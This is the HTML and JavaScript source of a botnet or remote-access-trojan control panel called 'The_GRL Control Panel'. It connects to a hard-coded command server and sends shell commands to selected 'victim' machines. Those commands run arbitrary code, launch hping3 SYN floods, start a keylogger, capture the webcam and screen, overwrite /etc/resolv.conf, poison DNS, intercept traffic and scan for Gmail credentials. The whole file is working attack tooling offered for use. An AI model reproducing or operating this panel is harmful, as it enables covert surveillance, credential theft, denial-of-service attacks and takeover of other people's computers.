<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
  <script src='https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js'></script>.


  <script>

  var ips = [];

    var socket = io('http://13.126.74.47:8000');


  function generateUsersList(data) {
      data = JSON.parse(data);
    var str = '<table class="table">';
    str += "<tr><td>ID</td><td>Name</td><td>Rel</td><td>IP</td><td>HW</td>";
    for(var i = 0; i < data.length;i++) {
        if(data[i].type == 'dead' || data[i].type == 'acp') continue;
        str += "<tr><td>" + data[i].sockid + "</td><td>" + data[i].name + "</td><td>" + data[i].rel + "</td><td>" + data[i].lip + "</td><td>" + data[i].cpu[0].model + "</td>";
        ips[i] = data[i].lip;
    }
    str += "</table>";
    return str;
  }

  function genUserSelect(data) {
      data = JSON.parse(data);
    var str = 'Select Client: </label><select id="victim">';
    for(var i = 0; i < data.length;i++) {
        if(data[i].type == 'dead' || data[i].type == 'acp') continue;
        str += "<option value='" + data[i].sockid + "'>" + data[i].name + "</option>";
    }
    str += "</select>";
    return str;
  }


  
  
      

  $(document).ready(function() {

    $("#pic").on('click', function() { 
            
            var random = Math.floor(Math.random() * 1000000) + 1;
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'fswebcam /var/www/html/'+random+'.jpg' }, function (data) {

              $("#screen-op-body").html("<img style='width:100%' src='http://" + ips[$("#victim").val()] + "/" + random + ".jpg'></img>");
                $("#screen-op").modal('show');

          });   
          
    });



    //flood

    $("#botnetstart").on('click', function() { 
        socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source ' + $("#botnetip").val() }, function (data) {
              alert("Started attack!");
        });
    });

    $("#botnetstop").on('click', function() { 
        socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'killall -9 hping3' }, function (data) {
              alert("Stopped attack!");
        });
    });

    //ff

    $("#proxychange").on('click', function() { 
          socket.emit('change_proxy', { toclient: $("#victim").val(), ip: $("#ffip").val(), port: $("#ffport").val() }, function (data) {
              alert("Proxy changed!");
          });
      });


    //resolv
    $("#resolvedit").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'echo "' + $("#resolveditvalue").val() + '" > /etc/resolv.conf' }, function (data) {
                alert("Resolv Cache modified!");
          });
      });

    $("#resolvview").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'cat /etc/resolv.conf' }, function (data) {
              
                $("#lg-op-body").html(data);
                $("#lg-op").modal('show');
          });
      });


    //apps
     $("#viewapp").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'ps -Al' }, function (data) {
              
                $("#lg-op-body").html(data);
                $("#lg-op").modal('show');
          });
      });

      $("#killapp").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'killall -9 ' + $("#killappid").val() }, function (data) {
              alert("App killed!");
          });
      });



    //Messages

     $("#zenity").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'zenity --error --text="' + $("#zenityvalue").val() + '" --title="Alert\!"' }, function (data) { });
      });

       $("#notify").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'notify-send "' + $("#notifyvalue").val() + '"' }, function (data) { });
      });



//keylog

    $("#keylogview").on('click', function() { 
        var data = '<a target="__blank" href="http://' + ips[$("#victim").val()] + '/keys.txt">View Logs</a>';
                $("#cmd-op-body").html(data);
                $("#cmd-op").modal('show');
            
      });
    $("#keylogstart").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'logkeys --start --output /var/www/html/keys.txt' }, function (data) {});   
          alert("Keylogging started");
    });
    $("#keylogstop").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'logkeys --kill' }, function (data) {});  
          alert("Keylogging stopped"); 
    });
    //annoy1

    $("#keypressinv").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'xmodmap -e "pointer = 3 2 1"' }, function (data) {});   
    });

    $("#keypressok").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: 'xmodmap -e "pointer = 1 2 3"' }, function (data) {});   
    });
//cmd

      $("#runcmd").on('click', function() { 
          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: $("#cmdinput").val() }, function (data) {
              
                $("#cmd-op-body").html(data);
                $("#cmd-op").modal('show');
          });
      });

    //screens

    $("#screen").on('click', function() { 
            var random = Math.floor(Math.random() * 1000000) + 1;
           
           socket.emit('client_screenshot', { toclient: $("#victim").val(), rand: random }, function (data) {
                $("#screen-op-body").html("<img style='width:100%' src='http://" + ips[$("#victim").val()] + "/" + random + ".png'></img>");
                $("#screen-op").modal('show');
            });

           
          
      });


      $("#checkpass").on('click', function() { 
            $.get("filter.php", function(data, status){
               if(data.length < 5) alert("No credentials found!") ;
               else alert(data);
            });
          
      });

      $("#mitmdo").on('click', function() { 
          
                alert("All Data is not being itercepted!");
            socket.emit('mitmproxy_client', { toclient: $("#victim").val() }, function (data) {
                console.log(data);
            });
          
      });

      $("#poisondns").on('click', function() { 
          
                alert("DNS Poisoned!");
            socket.emit('dnspoison_client', { toclient: $("#victim").val() }, function (data) {
                console.log(data);
            });
      });
      
   });    
      
      
      
      
      
      
      
      
      
      
      
      
      

    socket.emit('client_connect', { name: 'admin', type: 'acp' }, function (data) {
        console.log("Connect ACK");
        socket.emit('list_clients', null, function (data) {
            console.log("Listing clients...");
            $("#clients").append(generateUsersList(data));

            $("#cselect").append(genUserSelect(data));

           

            


            
        });
    });


            

     </script>


</head>
<body>

  
<div class="container">

<nav class="navbar navbar-inverse navbar-fixed-top">
  <div class="container-fluid">
    <div class="navbar-header">
      <a class="navbar-brand" href="#">The_GRL Control Panel</a>
    </div>
    <ul class="nav navbar-nav">
      <li class="active"><a href="#">Control Panel</a></li>
    </ul>
  </div>
</nav>

    <br/><br/>

  <div class="row">
    <h2>Connected clients</h2>
    <div class="col-sm-12" id="clients">    </div>
  </div>

  <div class="row">
    <h2>Operations</h2>
    <div class="col-sm-12" id="cselect">    </div>
  </div>

  <div class="row">
    <div class="col-sm-4">
      <h3>Dialog Boxes</h3>
        <input id="notifyvalue" placeholder="Enter text"></input><button id="notify">Show Notification</button> 
    </div>

    <div class="col-sm-8" >
      <h3>Dialog Boxes</h3>
        <input id="zenityvalue" placeholder="Enter text"></input><button id="zenity">Show Dialog</button> 
    </div>

  </div>

  <div class="row">
    <div class="col-sm-4" id="operations">
        
      <h3>Remote Commands</h3>
        <input id="cmdinput" placeholder="Enter command"></input><button id="runcmd">Execute</button><br/> <br/>  
        <button id="viewapp">View running processes</button> <br/> <br/>  
        <input id="killappid" placeholder="Enter app-process-name"></input><button id="killapp">Kill Application</button>
    </div>

    <div class="col-sm-8" id="operations">
        
      <h3>Attacks</h3>
        <button id="mitmdo">Man In the Middle Attack</button><br/><br/>  
        <button id="checkpass">MITM - Scan for intercepted Gmail Cred.</button><br/><br/>  
        <button id="poisondns">Poison DNS Cache</button> <br/> <br/> 
        
        <input id="botnetip" placeholder="IP address"></input>
        <button id="botnetstart">Start Botnet Attack</button> 
        <button id="botnetstop">Stop Botnet Attack</button><br/> <br/> 
    </div>

  </div>

  <div class="row">
    
  </div>


<div class="row">
    <div class="col-sm-4" id="operations">
        
      <h3>Telemetry.</h3>
        <button id="screen">Screenshot</button> <br/> <br/> 
        <button id="pic">Webcam Capture</button> <br/> <br/> 

        <button id="keylogstart">Start Keylogger</button> <br/>
        <button id="keylogstop">Stop Keylogger</button> <br/> 
        <button id="keylogview">View Keylogger Logs</button> <br/> <br/> 
        
        <button id="keypressinv">Invert Mouse clicks</button> <br/> <br/> 
        <button id="keypressok">Default Mouse clicks</button> <br/> <br/> 
    </div>
    <div class="col-sm-8" id="operations">    

      <h3>Configuration</h3>
        <input id="ffip" placeholder="IP address"></input>
        <input id="ffport" placeholder="Port"></input>
        <button id="proxychange">Change Proxy Settings</button> <br/> <br/> 


        <input id="resolveditvalue" placeholder="Enter text.."></input>
        <button id="resolvedit">Edit DNS Resolver Cache</button> <br/> <br/> 
        <button id="resolvview">View DNS Resolver Cache</button> <br/> <br/> 

    </div>
    <div class="col-sm-0" id="operations">    </div>
  </div>



  <div class="modal fade" id="cmd-op" role="dialog">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Command Output</h4>
        </div>
        <div class="modal-body">
          <pre id="cmd-op-body"></pre>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>

  <div class="modal fade" id="screen-op" role="dialog">
    <div class="modal-dialog modal-lg">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Screenshot</h4>
        </div>
        <div class="modal-body">
          <p id="screen-op-body"></p>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>

  <div class="modal fade" id="lg-op" role="dialog">
    <div class="modal-dialog modal-lg">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Info</h4>
        </div>
        <div class="modal-body">
          <pre id="lg-op-body"></pre>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>


</div>

</body>
</html>



